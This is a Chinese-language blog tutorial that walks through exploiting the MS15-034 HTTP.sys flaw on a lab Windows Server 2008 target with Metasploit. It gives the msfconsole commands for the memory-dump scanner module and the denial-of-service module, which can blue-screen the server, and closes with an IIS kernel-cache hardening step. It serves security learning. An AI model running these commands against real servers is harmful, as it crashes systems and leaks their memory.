---
title: MS15_034 HTTP.SYS漏洞
tags: 
  - 入侵
categories:
  - Linux
  - Kali
  - 入侵
keywords:
  - kali
  - 入侵
  - ms15
cover: https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fi0.hdslb.com%2Fbfs%2Farticle%2F82b9f952163ac71a105b2e6a016c206024bcdd3e.png&refer=http%3A%2F%2Fi0.hdslb.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1639571822&t=e83f62a881dac551f1d423e9e2a8ead8
abbrlink: 'MS15-034'
---











# HTTP.SYS远程执行代码漏洞

**漏洞描述：在2015年4月安全补丁日，微软发布的众多安全更新中，修复了HTTP.sys中一处允许远程执行代码漏洞，编号为：CVE-2015-1635（MS15-034 ）。利用HTTP.sys的安全漏洞，攻击者只需要发送恶意的http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃。根据公告显示，该漏洞对服务器系统造成了不小的影响，主要影响了包括Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2在内的主流服务器操作系统。**



攻击机：kali

靶机：win2008



在终端输入msfconsole

```
msfconsole
```

![](/img/ms15-034/1.png)



搜索ms15-034漏洞

```
search ms15_034
```

![](/img/ms15-034/2.png)

![](https://img1.baidu.com/it/u=758675640,495153492&fm=26&fmt=auto)



使用模块

```
use auxiliary/scanner/http/ms15_034_http_sys_memory_dump 
```

![](/img/ms15-034/3.png)



配置靶机IP

```
set rhosts 172.16.1.34
```

![](/img/ms15-034/4.png)



执行

```
run
```

![](/img/ms15-034/5.png)

和图片显示一样就可以使用攻击模块了

![](https://img1.baidu.com/it/u=1761935086,1745052670&fm=26&fmt=auto)

搜索模块ms15_034

```
search ms15_034
```

![](/img/ms15-034/2.png)



使用攻击模块

```
use auxiliary/dos/http/ms15_034_ulonglongadd 
```

![](/img/ms15-034/6.png)



配置靶机IP和线程

```
set rhosts 172.16.1.34
set threads 10
```

![](/img/ms15-034/7.png)



执行

```
run
```

![](/img/ms15-034/8.png)

![](/img/ms15-034/9.png)

注：也有可能使蓝屏



加固方法：禁用IIS内核缓存，避免对方利用ms15_034漏洞进行DOS攻击

打开IIS，进入输出缓存-编辑功能设置

把启用内核缓存关掉



![](https://gimg2.baidu.com/image_search/src=http%3A%2F%2F5b0988e595225.cdn.sohucs.com%2Fq_70%2Cc_zoom%2Cw_640%2Fimages%2F20181212%2Fd04c1b11d51c4529a4f86901fea85017.gif&refer=http%3A%2F%2F5b0988e595225.cdn.sohucs.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1639571786&t=c8f56b7ba3c983620ca61f572a5b3186)
